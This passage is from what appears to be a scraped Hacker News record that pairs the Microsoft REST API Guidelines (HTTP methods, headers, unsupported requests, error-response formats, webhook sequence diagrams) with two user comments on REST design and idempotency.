HTTP. Furthermore, services that allow client defined HTTP web hooks callback URLs SHOULD be compliant with privacy policy specified by engineering leadership. This will typically include recommending that clients prefer SSL connections and adhere to special precautions to ensure that logs and other service data collection are properly handled. For example, services may not want to require developers to generate certificates to onboard. Services might only enable this on test accounts. 15 Unsupported requests RESTful API clients MAY request functionality that is currently unsupported. RESTful APIs MUST respond to valid but unsupported requests consistent with this section. 15.1 Essential guidance RESTful APIs will often choose to limit functionality that can be performed by clients. For instance, auditing systems allow records to be created but not modified or deleted. Similarly, some APIs will expose collections but require or otherwise limit filtering and ordering criteria, or MAY not support client-driven pagination. 15.2 Feature allow list If a service does not support any of the below API features, then an error response MUST be provided if the feature is requested by a caller. The features are: Key Addressing in a collection, such as: https://api.contoso.com/v1.0/people/user1@contoso.com Filtering a collection by a property value, such as: https://api.contoso.com/v1.0/people?$filter=name eq 'david' Filtering a collection by range, such as: http://api.contoso.com/v1.0/people?$filter=hireDate ge 2014-01-01 and hireDate le 2014-12-31 Client-driven pagination via $top and $skip, such as: http://api.contoso.com/v1.0/people?$top=5&$skip=2 Sorting by $orderBy, such as: https://api.contoso.com/v1.0/people?$orderBy=name desc Providing $delta tokens, such as: https://api.contoso.com/v1.0/people?$delta 15.2.1 Error response Services MUST provide an error response if a caller requests an unsupported feature found in the feature allow list. The error response MUST be an HTTP status code from the 4xx series, indicating that the request cannot be fulfilled. Unless a more specific error status is appropriate for the given request, services SHOULD return \"400 Bad Request\" and an error payload conforming to the error response guidance provided in the Microsoft REST API Guidelines. Services SHOULD include enough detail in the response message for a developer to determine exactly what portion of the request is not supported. Example: GET https://api.contoso.com/v1.0/people?$orderBy=name HTTP/1.1 Accept: application/json HTTP/1.1 400 Bad Request Content-Type: application/json { \"error\": { \"code\": \"ErrorUnsupportedOrderBy\", \"message\": \"Ordering by name is not supported.\" } } 16 Appendix 16.1 Sequence diagram notes All sequence diagrams in this document are generated using the WebSequenceDiagrams.com web site. To generate them, paste the text below into the web tool. 16.1.1 Push notifications, per user flow === Being Text === note over Developer, Automation, App Server: An App Developer like MovieMaker Wants to integrate with primary service like Dropbox end note note over DB Portal, DB App Registration, DB Notifications, DB Auth, DB Service: The primary service like Dropbox note over Client: The end users' browser or installed app note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Manual App Registration Developer <--> DB Portal : Login into Portal, App Registration UX DB Portal -> +DB App Registration: App Name etc. note over DB App Registration: Confirm Portal Access Token DB App Registration -> -DB Portal: App ID DB Portal <--> App Server: Developer copies App ID note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Manual Notification Registration Developer <--> DB Portal: webhook registration UX DB Portal -> +DB Notifications: Register: App Server webhook URL, Scope, App ID Note over DB Notifications : Confirm Portal Access Token DB Notifications -> -DB Portal: notification ID DB Portal --> App Server : Developer may copy notification ID note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Client Authorization Client -> +App Server : Request access to DB protected information App Server -> -Client : Redirect to DB Authorization endpoint with authorization request Client -> +DB Auth : Redirected authorization request Client <--> DB Auth : Authorization UX DB Auth -> -Client : Redirect back to App Server with code Client -> +App Server : Redirect request back to access server with access code App Server -> +DB Auth : Request tokens with access code note right of DB Service: Cache that this User ID provided access to App ID DB Auth -> -App Server : Response with access, refresh, and ID tokens note right of App Server : Cache tokens by user ID App Server -> -Client : Return information to client note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Notification Flow Client <--> DB Service: Changes to user data - typical via interacting with App Server via Client DB Service -> App Server : Notification with notification ID and user ID App Server -> +DB Service : Request changed information with cached access tokens and \"since\" token note over DB Service: Confirm User Access Token DB Service -> -App Server : Response with data and new \"since\" token note right of App Server: Update status and cache new \"since\" token === End Text === 16.1.2 Push notifications, firehose flow === Being Text === note over Developer, Automation, App Server: An App Developer like MovieMaker Wants to integrate with primary service like Dropbox end note note over DB Portal, DB App Registration, DB Notifications, DB Auth, DB Service: The primary service like Dropbox note over Client: The end users' browser or installed app note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : App Registration alt Automated app registration Developer <--> Automation: Configure Automation -> +DB App Registration: App Name etc. note over DB App Registration: Confirm App Access Token DB App Registration -> -Automation: App ID, App Secret Automation --> App Server : Embed App ID, App Secret else Manual app registration Developer <--> DB Portal : Login into Portal, App Registration UX DB Portal -> +DB App Registration: App Name etc. note over DB App Registration: Confirm Portal Access Token DB App Registration -> -DB Portal: App ID DB Portal <--> App Server: Developer copies App ID end note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Client Authorization Client -> +App Server : Request access to DB protected information App Server -> -Client : Redirect to DB Authorization endpoint with authorization request Client -> +DB Auth : Redirected authorization request Client <--> DB Auth : Authorization UX DB Auth -> -Client : Redirect back to App Server with code Client -> +App Server : Redirect request back to access server with access code App Server -> +DB Auth : Request tokens with access code note right of DB Service: Cache that this User ID provided access to App ID DB Auth -> -App Server : Response with access, refresh, and ID tokens note right of App Server : Cache tokens by user ID App Server -> -Client : Return information to client note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Notification Registration App Server->+DB Notifications: Register: App server webhook URL, Scope, App ID note over DB Notifications : Confirm User Access Token DB Notifications -> -App Server: notification ID note right of App Server : Cache the Notification ID and User Access Token note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Notification Flow Client <--> DB Service: Changes to user data - typical via interacting with App Server via Client DB Service -> App Server : Notification with notification ID and user ID App Server -> +DB Service : Request changed information with cached access tokens and \"since\" token note over DB Service: Confirm User Access Token DB Service -> -App Server : Response with data and new \"since\" token note right of App Server: Update status and cache new \"since\" token === End Text === ",
          "Every single person writing a REST api should have to memorize this table:<p>GET - Return the current value of an object, is idempotent;<p>PUT - Replace an object, or create a named object, when applicable, is idempotent;<p>DELETE - Delete an object, is idempotent;<p>POST - Create a new object based on the data provided, or submit a command, NOT idempotent;<p>HEAD - Return metadata of an object for a GET response. Resources that support the GET method MAY support the HEAD method as well, is idempotent;<p>PATCH - Apply a partial update to an object, NOT idempotent;<p>OPTIONS - Get information about a request, is idempotent.<p>Most importantly, that PUT is idempotent.<p>Credit to arkadiytehgraet for retyping the table to be readable.  Please give them an upvote for the effort.",
          "I've designed quite some REST APIs, but I've come to the conclusion that all those semantic/HATEOS or other REST guidelines don't always apply or make sense, depending on the problem domain.<p>I worked in finance and designed a REST API, and besides the standard user/account object, basically ALL the data and operations were neither idempotent, cacheable, durable and often couldn't possible be designed using HATEOS et al.<p>Quotes, orders, offers and transactions carry lots of monetary amounts which are sent in user currency, which is auto-converted depending on the user requesting it (and currency conversion rates is part of the business). Most offers are only valid a limited amount of time (seconds to minutes) because of changing market rates. There is also no \"changing\" of object as in PATCH/DELETE, all you do is trigger operations via the API and every action you ever did is kept in a log (regulatory wise, but also to display for the end user).<p>There is some way to try to hammer this thing to fit with HATEOS et. al. and I put some effort in it, but I would have ended up splitting DTOs into idempotent/mutable and non-idempotent/mutable parts and spread them across different services, bloat the DTOs themselves (i.e. include all available currencies in a quote/offer) and have the validity/expiry of objects via HTTP caching (instead of the DTOs). That would have ended up in a complex and hard-to-read API, would have significantly worse performance (due to lot of unneeded data & calculations) and some insane design decisions (like keeping expired offers/quotes around just so they are still available at their service URL with an id, even though the business requirements would never store expired offers).<p>Sometimes you just need to use your own head, accept that the problem domain might not be covered by other \"guidelines\", and come up with a sane design yourself."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/Microsoft/api-guidelines/blob/master/Guidelines.md",
        "comments.comment_id": [21610184, 21613215],
        "comments.comment_author": ["jedberg", "littlecranky67"],
        "comments.comment_descendants": [11, 1],
        "comments.comment_time": [
          "2019-11-22T21:19:10Z",
          "2019-11-23T09:10:02Z"
        ],
        "comments.comment_text": [
          "Every single person writing a REST api should have to memorize this table:<p>GET - Return the current value of an object, is idempotent;<p>PUT - Replace an object, or create a named object, when applicable, is idempotent;<p>DELETE - Delete an object, is idempotent;<p>POST - Create a new object based on the data provided, or submit a command, NOT idempotent;<p>HEAD - Return metadata of an object for a GET response. Resources that support the GET method MAY support the HEAD method as well, is idempotent;<p>PATCH - Apply a partial update to an object, NOT idempotent;<p>OPTIONS - Get information about a request, is idempotent.<p>Most importantly, that PUT is idempotent.<p>Credit to arkadiytehgraet for retyping the table to be readable.  Please give them an upvote for the effort.",
          "I've designed quite some REST APIs, but I've come to the conclusion that all those semantic/HATEOS or other REST guidelines don't always apply or make sense, depending on the problem domain.<p>I worked in finance and designed a REST API, and besides the standard user/account object, basically ALL the data and operations were neither idempotent, cacheable, durable and often couldn't possible be designed using HATEOS et al.<p>Quotes, orders, offers and transactions carry lots of monetary amounts which are sent in user currency, which is auto-converted depending on the user requesting it (and currency conversion rates is part of the business). Most offers are only valid a limited amount of time (seconds to minutes) because of changing market rates. There is also no \"changing\" of object as in PATCH/DELETE, all you do is trigger operations via the API and every action you ever did is kept in a log (regulatory wise, but also to display for the end user).<p>There is some way to try to hammer this thing to fit with HATEOS et. al. and I put some effort in it, but I would have ended up splitting DTOs into idempotent/mutable and non-idempotent/mutable parts and spread them across different services, bloat the DTOs themselves (i.e. include all available currencies in a quote/offer) and have the validity/expiry of objects via HTTP caching (instead of the DTOs). That would have ended up in a complex and hard-to-read API, would have significantly worse performance (due to lot of unneeded data & calculations) and some insane design decisions (like keeping expired offers/quotes around just so they are still available at their service URL with an id, even though the business requirements would never store expired offers).<p>Sometimes you just need to use your own head, accept that the problem domain might not be covered by other \"guidelines\", and come up with a sane design yourself."
        ],
        "id": "807ec252-0238-4a42-9a37-770a28237076",
        "url_text": "Microsoft REST API Guidelines Microsoft REST API Guidelines Working Group Name Name Name Dave Campbell (CTO C+E) Rick Rashid (CTO ASG) John Shewchuk (Technical Fellow, TED HQ) Mark Russinovich (CTO Azure) Steve Lucco (Technical Fellow, DevDiv) Murali Krishnaprasad (Azure App Plat) Rob Howard (ASG) Peter Torr (OSG) Chris Mullins (ASG) Document editors: John Gossman (C+E), Chris Mullins (ASG), Gareth Jones (ASG), Rob Dolin (C+E), Mark Stafford (C+E) Microsoft REST API Guidelines 1 Abstract The Microsoft REST API Guidelines, as a design principle, encourages application developers to have resources accessible to them via a RESTful HTTP interface. To provide the smoothest possible experience for developers on platforms following the Microsoft REST API Guidelines, REST APIs SHOULD follow consistent design guidelines to make using them easy and intuitive. This document establishes the guidelines Microsoft REST APIs SHOULD follow so RESTful interfaces are developed consistently. 2 Table of contents Microsoft REST API Guidelines 2.3 Microsoft REST API Guidelines Working Group Microsoft REST API Guidelines 1 Abstract 2 Table of contents 3 Introduction 3.1 Recommended reading 4 Interpreting the guidelines 4.1 Application of the guidelines 4.2 Guidelines for existing services and versioning of services 4.3 Requirements language 4.4 License 5 Taxonomy 5.1 Errors 5.2 Faults 5.3 Latency 5.4 Time to complete 5.5 Long running API faults 6 Client guidance 6.1 Ignore rule 6.2 Variable order rule 6.3 Silent fail rule 7 Consistency fundamentals 7.1 URL structure 7.2 URL length 7.3 Canonical identifier 7.4 Supported methods 7.5 Standard request headers 7.6 Standard response headers 7.7 Custom headers 7.8 Specifying headers as query parameters 7.9 PII parameters 7.10 Response formats 7.11 HTTP Status Codes 7.12 Client library optional 8 CORS 8.1 Client guidance 8.2 Service guidance 9 Collections 9.1 Item keys 9.2 Serialization 9.3 Collection URL patterns 9.4 Big collections 9.5 Changing collections 9.6 Sorting collections 9.7 Filtering 9.8 Pagination 9.9 Compound collection operations 10 Delta queries 10.1 Delta links 10.2 Entity representation 10.3 Obtaining a delta link 10.4 Contents of a delta link response 10.5 Using a delta link 11 JSON standardizations 11.1 JSON formatting standardization for primitive types 11.2 Guidelines for dates and times 11.3 JSON serialization of dates and times 11.4 Durations 11.5 Intervals 11.6 Repeating intervals 12 Versioning 12.1 Versioning formats 12.2 When to version 12.3 Definition of a breaking change 13 Long running operations 13.1 Resource based long running operations (RELO) 13.2 Stepwise long running operations 13.3 Retention policy for operation results 14 Push notifications via webhooks 14.1 Scope 14.2 Principles 14.3 Types of subscriptions 14.4 Call sequences 14.5 Verifying subscriptions 14.6 Receiving notifications 14.7 Managing subscriptions programmatically 14.8 Security 15 Unsupported requests 15.1 Essential guidance 15.2 Feature allow list 16 Appendix 16.1 Sequence diagram notes 3 Introduction Developers access most Microsoft Cloud Platform resources via HTTP interfaces. Although each service typically provides language-specific frameworks to wrap their APIs, all of their operations eventually boil down to HTTP requests. Microsoft must support a wide range of clients and services and cannot rely on rich frameworks being available for every development environment. Thus a goal of these guidelines is to ensure Microsoft REST APIs can be easily and consistently consumed by any client with basic HTTP support. To provide the smoothest possible experience for developers, it's important to have these APIs follow consistent design guidelines, thus making using them easy and intuitive. This document establishes the guidelines to be followed by Microsoft REST API developers for developing such APIs consistently. The benefits of consistency accrue in aggregate as well; consistency allows teams to leverage common code, patterns, documentation and design decisions. These guidelines aim to achieve the following: Define consistent practices and patterns for all API endpoints across Microsoft. Adhere as closely as possible to accepted REST/HTTP best practices in the industry at-large.* Make accessing Microsoft Services via REST interfaces easy for all application developers. Allow service developers to leverage the prior work of other services to implement, test and document REST endpoints defined consistently. Allow for partners (e.g., non-Microsoft entities) to use these guidelines for their own REST endpoint design. Note: The guidelines are designed to align with building services which comply with the REST architectural style, though they do not address or require building services that follow the REST constraints. The term \"REST\" is used throughout this document to mean services that are in the spirit of REST rather than adhering to REST by the book. 3.1 Recommended reading Understanding the philosophy behind the REST Architectural Style is recommended for developing good HTTP-based services. If you are new to RESTful design, here are some good resources: REST on Wikipedia -- Overview of common definitions and core ideas behind REST. REST Dissertation -- The chapter on REST in Roy Fielding's dissertation on Network Architecture, \"Architectural Styles and the Design of Network-based Software Architectures\" RFC 7231 -- Defines the specification for HTTP/1.1 semantics, and is considered the authoritative resource. REST in Practice -- Book on the fundamentals of REST. 4 Interpreting the guidelines 4.1 Application of the guidelines These guidelines are applicable to any REST API exposed publicly by Microsoft or any partner service. Private or internal APIs SHOULD also try to follow these guidelines because internal services tend to eventually be exposed publicly. Consistency is valuable to not only external customers but also internal service consumers, and these guidelines offer best practices useful for any service. There are legitimate reasons for exemption from these guidelines. Obviously a REST service that implements or must interoperate with some externally defined REST API must be compatible with that API and not necessarily these guidelines. Some services MAY also have special performance needs that require a different format, such as a binary protocol. 4.2 Guidelines for existing services and versioning of services We do not recommend making a breaking change to a service that pre-dates these guidelines simply for compliance sake. The service SHOULD try to become compliant at the next version release when compatibility is being broken anyway. When a service adds a new API, that API SHOULD be consistent with the other APIs of the same version. So if a service was written against version 1.0 of the guidelines, new APIs added incrementally to the service SHOULD also follow version 1.0. The service can then upgrade to align with the latest version of the guidelines at the service's next major release. 4.3 Requirements language The keywords \"MUST,\" \"MUST NOT,\" \"REQUIRED,\" \"SHALL,\" \"SHALL NOT,\" \"SHOULD,\" \"SHOULD NOT,\" \"RECOMMENDED,\" \"MAY,\" and \"OPTIONAL\" in this document are to be interpreted as described in RFC 2119. 4.4 License This work is licensed under the Creative Commons Attribution 4.0 International License. To view a copy of this license, visit http://creativecommons.org/licenses/by/4.0/ or send a letter to Creative Commons, PO Box 1866, Mountain View, CA 94042, USA. 5 Taxonomy As part of onboarding to Microsoft REST API Guidelines, services MUST comply with the taxonomy defined below. 5.1 Errors Errors, or more specifically Service Errors, are defined as a client passing invalid data to the service and the service correctly rejecting that data. Examples include invalid credentials, incorrect parameters, unknown version IDs, or similar. These are generally \"4xx\" HTTP error codes and are the result of a client passing incorrect or invalid data. Errors do not contribute to overall API availability. 5.2 Faults Faults, or more specifically Service Faults, are defined as the service failing to correctly return in response to a valid client request. These are generally \"5xx\" HTTP error codes. Faults do contribute to the overall API availability. Calls that fail due to rate limiting or quota failures MUST NOT count as faults. Calls that fail as the result of a service fast-failing requests (often for its own protection) do count as faults. 5.3 Latency Latency is defined as how long a particular API call takes to complete, measured as closely to the client as possible. This metric applies to both synchronous and asynchronous APIs in the same way. For long running calls, the latency is measured on the initial request and measures how long that call (not the overall operation) takes to complete. 5.4 Time to complete Services that expose long operations MUST track \"Time to Complete\" metrics around those operations. 5.5 Long running API faults For a Long Running API, it's possible for both the initial request to begin the operation and the request to retrieve the results to technically work (each passing back a 200), but for the underlying operation to have failed. Long Running faults MUST roll up as Faults into the overall Availability metrics. 6 Client guidance To ensure the best possible experience for clients talking to a REST service, clients SHOULD adhere to the following best practices: 6.1 Ignore rule For loosely coupled clients where the exact shape of the data is not known before the call, if the server returns something the client wasn't expecting, the client MUST safely ignore it. Some services MAY add fields to responses without changing versions numbers. Services that do so MUST make this clear in their documentation and clients MUST ignore unknown fields. 6.2 Variable order rule Clients MUST NOT rely on the order in which data appears in JSON service responses. For example, clients SHOULD be resilient to the reordering of fields within a JSON object. When supported by the service, clients MAY request that data be returned in a specific order. For example, services MAY support the use of the $orderBy querystring parameter to specify the order of elements within a JSON array. Services MAY also explicitly specify the ordering of some elements as part of the service contract. For example, a service MAY always return a JSON object's \"type\" information as the first field in an object to simplify response parsing on the client. Clients MAY rely on ordering behavior explicitly identified by the service. 6.3 Silent fail rule Clients requesting OPTIONAL server functionality (such as optional headers) MUST be resilient to the server ignoring that particular functionality. 7 Consistency fundamentals 7.1 URL structure Humans SHOULD be able to easily read and construct URLs. This facilitates discovery and eases adoption on platforms without a well-supported client library. An example of a well-structured URL is: https://api.contoso.com/v1.0/people/jdoe@contoso.com/inbox An example URL that is not friendly is: https://api.contoso.com/EWS/OData/Users('jdoe@microsoft.com')/Folders('AAMkADdiYzI1MjUzLTk4MjQtNDQ1Yy05YjJkLWNlMzMzYmIzNTY0MwAuAAAAAACzMsPHYH6HQoSwfdpDx-2bAQCXhUk6PC1dS7AERFluCgBfAAABo58UAAA=') A frequent pattern that comes up is the use of URLs as values. Services MAY use URLs as values. For example, the following is acceptable: https://api.contoso.com/v1.0/items?url=https://resources.contoso.com/shoes/fancy 7.2 URL length The HTTP 1.1 message format, defined in RFC 7230, in section 3.1.1, defines no length limit on the Request Line, which includes the target URL. From the RFC: HTTP does not place a predefined limit on the length of a request-line. [...] A server that receives a request-target longer than any URI it wishes to parse MUST respond with a 414 (URI Too Long) status code. Services that can generate URLs longer than 2,083 characters MUST make accommodations for the clients they wish to support. Here are some sources for determining what target clients support: http://stackoverflow.com/a/417184 https://blogs.msdn.microsoft.com/ieinternals/2014/08/13/url-length-limits/ Also note that some technology stacks have hard and adjustable url limits, so keep this in mind as you design your services. 7.3 Canonical identifier In addition to friendly URLs, resources that can be moved or be renamed SHOULD expose a URL that contains a unique stable identifier. It MAY be necessary to interact with the service to obtain a stable URL from the friendly name for the resource, as in the case of the \"/my\" shortcut used by some services. The stable identifier is not required to be a GUID. An example of a URL containing a canonical identifier is: https://api.contoso.com/v1.0/people/7011042402/inbox 7.4 Supported methods Operations MUST use the proper HTTP methods whenever possible, and operation idempotency MUST be respected. HTTP methods are frequently referred to as the HTTP verbs. The terms are synonymous in this context, however the HTTP specification uses the term method. Below is a list of methods that Microsoft REST services SHOULD support. Not all resources will support all methods, but all resources using the methods below MUST conform to their usage. Method Description Is Idempotent GET Return the current value of an object True PUT Replace an object, or create a named object, when applicable True DELETE Delete an object True POST Create a new object based on the data provided, or submit a command False HEAD Return metadata of an object for a GET response. Resources that support the GET method MAY support the HEAD method as well True PATCH Apply a partial update to an object False OPTIONS Get information about a request; see below for details. True Table 1 7.4.1 POST POST operations SHOULD support the Location response header to specify the location of any created resource that was not explicitly named, via the Location header. As an example, imagine a service that allows creation of hosted servers, which will be named by the service: POST http://api.contoso.com/account1/servers The response would be something like: 201 Created Location: http://api.contoso.com/account1/servers/server321 Where \"server321\" is the service-allocated server name. Services MAY also return the full metadata for the created item in the response. 7.4.2 PATCH PATCH has been standardized by IETF as the method to be used for updating an existing object incrementally (see RFC 5789). Microsoft REST API Guidelines compliant APIs SHOULD support PATCH. 7.4.3 Creating resources via PATCH (UPSERT semantics) Services that allow callers to specify key values on create SHOULD support UPSERT semantics, and those that do MUST support creating resources using PATCH. Because PUT is defined as a complete replacement of the content, it is dangerous for clients to use PUT to modify data. Clients that do not understand (and hence ignore) properties on a resource are not likely to provide them on a PUT when trying to update a resource, hence such properties could be inadvertently removed. Services MAY optionally support PUT to update existing resources, but if they do they MUST use replacement semantics (that is, after the PUT, the resource's properties MUST match what was provided in the request, including deleting any server properties that were not provided). Under UPSERT semantics, a PATCH call to a nonexistent resource is handled by the server as a \"create,\" and a PATCH call to an existing resource is handled as an \"update.\" To ensure that an update request is not treated as a create or vice-versa, the client MAY specify precondition HTTP headers in the request. The service MUST NOT treat a PATCH request as an insert if it contains an If-Match header and MUST NOT treat a PATCH request as an update if it contains an If-None-Match header with a value of \"*\". If a service does not support UPSERT, then a PATCH call against a resource that does not exist MUST result in an HTTP \"409 Conflict\" error. 7.4.4 Options and link headers OPTIONS allows a client to retrieve information about a resource, at a minimum by returning the Allow header denoting the valid methods for this resource. In addition, services SHOULD include a Link header (see RFC 5988) to point to documentation for the resource in question: Link: <{help}>; rel=\"help\" Where {help} is the URL to a documentation resource. For examples on use of OPTIONS, see preflighting CORS cross-domain calls. 7.5 Standard request headers The table of request headers below SHOULD be used by Microsoft REST API Guidelines services. Using these headers is not mandated, but if used they MUST be used consistently. All header values MUST follow the syntax rules set forth in the specification where the header field is defined. Many HTTP headers are defined in RFC7231, however a complete list of approved headers can be found in the IANA Header Registry.\" Header Type Description Authorization String Authorization header for the request Date Date Timestamp of the request, based on the client's clock, in RFC 5322 date and time format. The server SHOULD NOT make any assumptions about the accuracy of the client's clock. This header MAY be included in the request, but MUST be in this format when supplied. Greenwich Mean Time (GMT) MUST be used as the time zone reference for this header when it is provided. For example: Wed, 24 Aug 2016 18:41:30 GMT. Note that GMT is exactly equal to UTC (Coordinated Universal Time) for this purpose. Accept Content type The requested content type for the response such as: application/xmltext/xmlapplication/jsontext/javascript (for JSONP)Per the HTTP guidelines, this is just a hint and responses MAY have a different content type, such as a blob fetch where a successful response will just be the blob stream as the payload. For services following OData, the preference order specified in OData SHOULD be followed. Accept-Encoding Gzip, deflate REST endpoints SHOULD support GZIP and DEFLATE encoding, when applicable. For very large resources, services MAY ignore and return uncompressed data. Accept-Language \"en\", \"es\", etc. Specifies the preferred language for the response. Services are not required to support this, but if a service supports localization it MUST do so through the Accept-Language header. Accept-Charset Charset type like \"UTF-8\" Default is UTF-8, but services SHOULD be able to handle ISO-8859-1. Content-Type Content type Mime type of request body (PUT/POST/PATCH) Prefer return=minimal, return=representation If the return=minimal preference is specified, services SHOULD return an empty body in response to a successful insert or update. If return=representation is specified, services SHOULD return the created or updated resource in the response. Services SHOULD support this header if they have scenarios where clients would sometimes benefit from responses, but sometimes the response would impose too much of a hit on bandwidth. If-Match, If-None-Match, If-Range String Services that support updates to resources using optimistic concurrency control MUST support the If-Match header to do so. Services MAY also use other headers related to ETags as long as they follow the HTTP specification. 7.6 Standard response headers Services SHOULD return the following response headers, except where noted in the \"required\" column. Response Header Required Description Date All responses Timestamp the response was processed, based on the server's clock, in RFC 5322 date and time format. This header MUST be included in the response. Greenwich Mean Time (GMT) MUST be used as the time zone reference for this header. For example: Wed, 24 Aug 2016 18:41:30 GMT. Note that GMT is exactly equal to UTC (Coordinated Universal Time) for this purpose. Content-Type All responses The content type Content-Encoding All responses GZIP or DEFLATE, as appropriate Preference-Applied When specified in request Whether a preference indicated in the Prefer request header was applied ETag When the requested resource has an entity tag The ETag response-header field provides the current value of the entity tag for the requested variant. Used with If-Match, If-None-Match and If-Range to implement optimistic concurrency control. 7.7 Custom headers Custom headers MUST NOT be required for the basic operation of a given API. Some of the guidelines in this document prescribe the use of nonstandard HTTP headers. In addition, some services MAY need to add extra functionality, which is exposed via HTTP headers. The following guidelines help maintain consistency across usage of custom headers. Headers that are not standard HTTP headers MUST have one of two formats: A generic format for headers that are registered as \"provisional\" with IANA (RFC 3864) A scoped format for headers that are too usage-specific for registration These two formats are described below. 7.8 Specifying headers as query parameters Some headers pose challenges for some scenarios such as AJAX clients, especially when making cross-domain calls where adding headers MAY not be supported. As such, some headers MAY be accepted as Query Parameters in addition to headers, with the same naming as the header: Not all headers make sense as query parameters, including most standard HTTP headers. The criteria for considering when to accept headers as parameters are: Any custom headers MUST be also accepted as parameters. Required standard headers MAY be accepted as parameters. Required headers with security sensitivity (e.g., Authorization header) MIGHT NOT be appropriate as parameters; the service owner SHOULD evaluate these on a case-by-case basis. The one exception to this rule is the Accept header. It's common practice to use a scheme with simple names instead of the full functionality described in the HTTP specification for Accept. 7.9 PII parameters Consistent with their organization's privacy policy, clients SHOULD NOT transmit personally identifiable information (PII) parameters in the URL (as part of path or query string) because this information can be inadvertently exposed via client, network, and server logs and other mechanisms. Consequently, a service SHOULD accept PII parameters transmitted as headers. However, there are many scenarios where the above recommendations cannot be followed due to client or software limitations. To address these limitations, services SHOULD also accept these PII parameters as part of the URL consistent with the rest of these guidelines. Services that accept PII parameters -- whether in the URL or as headers -- SHOULD be compliant with privacy policy specified by their organization's engineering leadership. This will typically include recommending that clients prefer headers for transmission and implementations adhere to special precautions to ensure that logs and other service data collection are properly handled. 7.10 Response formats For organizations to have a successful platform, they must serve data in formats developers are accustomed to using, and in consistent ways that allow developers to handle responses with common code. Web-based communication, especially when a mobile or other low-bandwidth client is involved, has moved quickly in the direction of JSON for a variety of reasons, including its tendency to be lighter weight and its ease of consumption with JavaScript-based clients. JSON property names SHOULD be camelCased. Services SHOULD provide JSON as the default encoding. 7.10.1 Clients-specified response format In HTTP, response format SHOULD be requested by the client using the Accept header. This is a hint, and the server MAY ignore it if it chooses to, even if this isn't typical of well-behaved servers. Clients MAY send multiple Accept headers and the service MAY choose one of them. The default response format (no Accept header provided) SHOULD be application/json, and all services MUST support application/json. Accept Header Response type Notes application/json Payload SHOULD be returned as JSON Also accept text/javascript for JSONP cases GET https://api.contoso.com/v1.0/products/user Accept: application/json 7.10.2 Error condition responses For nonsuccess conditions, developers SHOULD be able to write one piece of code that handles errors consistently across different Microsoft REST API Guidelines services. This allows building of simple and reliable infrastructure to handle exceptions as a separate flow from successful responses. The following is based on the OData v4 JSON spec. However, it is very generic and does not require specific OData constructs. APIs SHOULD use this format even if they are not using other OData constructs. The error response MUST be a single JSON object. This object MUST have a name/value pair named \"error.\" The value MUST be a JSON object. This object MUST contain name/value pairs with the names \"code\" and \"message,\" and it MAY contain name/value pairs with the names \"target,\" \"details\" and \"innererror.\" The value for the \"code\" name/value pair is a language-independent string. Its value is a service-defined error code that SHOULD be human-readable. This code serves as a more specific indicator of the error than the HTTP error code specified in the response. Services SHOULD have a relatively small number (about 20) of possible values for \"code,\" and all clients MUST be capable of handling all of them. Most services will require a much larger number of more specific error codes, which are not interesting to all clients. These error codes SHOULD be exposed in the \"innererror\" name/value pair as described below. Introducing a new value for \"code\" that is visible to existing clients is a breaking change and requires a version increase. Services can avoid breaking changes by adding new error codes to \"innererror\" instead. The value for the \"message\" name/value pair MUST be a human-readable representation of the error. It is intended as an aid to developers and is not suitable for exposure to end users. Services wanting to expose a suitable message for end users MUST do so through an annotation or custom property. Services SHOULD NOT localize \"message\" for the end user, because doing so MAY make the value unreadable to the app developer who may be logging the value, as well as make the value less searchable on the Internet. The value for the \"target\" name/value pair is the target of the particular error (e.g., the name of the property in error). The value for the \"details\" name/value pair MUST be an array of JSON objects that MUST contain name/value pairs for \"code\" and \"message,\" and MAY contain a name/value pair for \"target,\" as described above. The objects in the \"details\" array usually represent distinct, related errors that occurred during the request. See example below. The value for the \"innererror\" name/value pair MUST be an object. The contents of this object are service-defined. Services wanting to return more specific errors than the root-level code MUST do so by including a name/value pair for \"code\" and a nested \"innererror.\" Each nested \"innererror\" object represents a higher level of detail than its parent. When evaluating errors, clients MUST traverse through all of the nested \"innererrors\" and choose the deepest one that they understand. This scheme allows services to introduce new error codes anywhere in the hierarchy without breaking backwards compatibility, so long as old error codes still appear. The service MAY return different levels of depth and detail to different callers. For example, in development environments, the deepest \"innererror\" MAY contain internal information that can help debug the service. To guard against potential security concerns around information disclosure, services SHOULD take care not to expose too much detail unintentionally. Error objects MAY also include custom server-defined name/value pairs that MAY be specific to the code. Error types with custom server-defined properties SHOULD be declared in the service's metadata document. See example below. Error responses MAY contain annotations in any of their JSON objects. We recommend that for any transient errors that may be retried, services SHOULD include a Retry-After HTTP header indicating the minimum number of seconds that clients SHOULD wait before attempting the operation again. ErrorResponse : Object Property Type Required Description error Error The error object. Error : Object Property Type Required Description code String (enumerated) One of a server-defined set of error codes. message String A human-readable representation of the error. target String The target of the error. details Error[] An array of details about specific errors that led to this reported error. innererror InnerError An object containing more specific information than the current object about the error. InnerError : Object Property Type Required Description code String A more specific error code than was provided by the containing error. innererror InnerError An object containing more specific information than the current object about the error. Examples Example of \"innererror\": { \"error\": { \"code\": \"BadArgument\", \"message\": \"Previous passwords may not be reused\", \"target\": \"password\", \"innererror\": { \"code\": \"PasswordError\", \"innererror\": { \"code\": \"PasswordDoesNotMeetPolicy\", \"minLength\": \"6\", \"maxLength\": \"64\", \"characterTypes\": [\"lowerCase\",\"upperCase\",\"number\",\"symbol\"], \"minDistinctCharacterTypes\": \"2\", \"innererror\": { \"code\": \"PasswordReuseNotAllowed\" } } } } } In this example, the most basic error code is \"BadArgument,\" but for clients that are interested, there are more specific error codes in \"innererror.\" The \"PasswordReuseNotAllowed\" code may have been added by the service at a later date, having previously only returned \"PasswordDoesNotMeetPolicy.\" Existing clients do not break when the new error code is added, but new clients MAY take advantage of it. The \"PasswordDoesNotMeetPolicy\" error also includes additional name/value pairs that allow the client to determine the server's configuration, validate the user's input programmatically, or present the server's constraints to the user within the client's own localized messaging. Example of \"details\": { \"error\": { \"code\": \"BadArgument\", \"message\": \"Multiple errors in ContactInfo data\", \"target\": \"ContactInfo\", \"details\": [ { 